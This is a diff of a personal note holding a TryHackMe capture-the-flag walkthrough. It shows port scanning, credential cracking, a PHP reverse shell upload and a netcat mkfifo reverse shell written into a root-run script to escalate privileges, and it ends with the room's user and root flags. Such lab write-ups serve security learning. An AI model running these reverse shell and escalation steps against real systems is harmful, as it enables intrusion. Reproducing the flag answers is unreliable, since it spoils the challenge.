@@ -1,6 +1,5 @@
 ![](https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg)
 
-
 ```
 ──(kali㉿kali)-[~]
 └─$ rustscan -a 10.10.3.185 --ulimit 5000 -b 65535 -- -A 
@@ -1603,8 +1602,6 @@ by Ben "epi" Risher 🤓                 ver: 2.7.0
 
 ```
 
-![[Pasted image 20220918115910.png]]
-
 ```
 download the backup_sql ip/content/inc/mysql_backup
 
@@ -1718,10 +1715,6 @@ manager:42f749ade7f9e195bf475f37a44cafcb (crackstation)
 manager:Password123
 ```
 
-![[Pasted image 20220918120125.png]]
-
-![[Pasted image 20220918121042.png]]
-
 ```
 load php revshell from pentestmonkey then upload in ads section
 
@@ -1782,7 +1775,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.1.77 443 >/tmp/f" > /etc/copy.sh
 < /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.1.77 443 >/tmp/f" > /etc/copy.sh
 
-
 sudo perl /home/itguy/backup.pl
 
 ┌──(kali㉿kali)-[~]
@@ -1795,20 +1787,12 @@ Ncat: Connection from 10.10.3.185:51716.
 # cat /root/root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 
-
 ```
-
-![[Pasted image 20220918121223.png]]
-
 
 What is the user flag?
 *THM{63e5bce9271952aad1113b6f1ac28a07}*
 
-
-
-
 What is the root flag?
 *THM{6637f41d0177b6f37cb20d775124699f}*
-
 
 [[BioHazard]]
